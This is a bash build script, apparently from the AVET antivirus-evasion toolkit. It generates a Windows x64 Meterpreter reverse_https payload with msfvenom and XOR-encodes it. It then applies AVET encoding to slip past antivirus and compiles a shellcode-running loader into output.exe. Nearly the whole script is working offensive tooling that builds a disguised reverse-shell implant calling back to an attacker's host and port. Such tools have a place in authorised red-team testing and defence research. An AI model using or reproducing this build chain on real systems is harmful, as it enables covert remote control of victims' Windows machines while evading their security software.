#!/bin/bash    
# Execute 64-bit shellcode. Uses XOR encoder from metasploit, as well as AVET encoding.

# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt

# Apply AVET encoding
encode_payload avet input/sc_c.txt input/scenc_raw.txt

# convert to c array format for static include
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# no command preexec
set_command_source no_data
set_command_exec no_command

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# set decoder and key source
# AVET decoder requires no key
set_decoder avet
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# enable debug output
enable_debug_print

# call make_avet, compile 
$win64_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques
